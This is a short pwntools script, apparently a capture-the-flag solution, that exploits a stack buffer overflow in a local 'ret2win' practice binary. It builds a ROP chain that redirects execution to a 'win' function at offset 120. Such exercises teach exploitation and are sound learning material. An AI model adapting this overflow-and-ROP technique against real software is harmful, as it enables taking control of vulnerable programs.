from pwn import *

elf = context.binary = ELF("./ret2win")

rop = ROP(elf)
rop.raw(rop.ret)
rop.call(elf.symbols["win"])

r = process("./ret2win")

r.recvuntil(b"> ")
r.sendline(b"1")
r.recvuntil(b"Give me a string: ")

payload = flat({120: rop.chain()})
r.sendline(payload)

r.interactive()

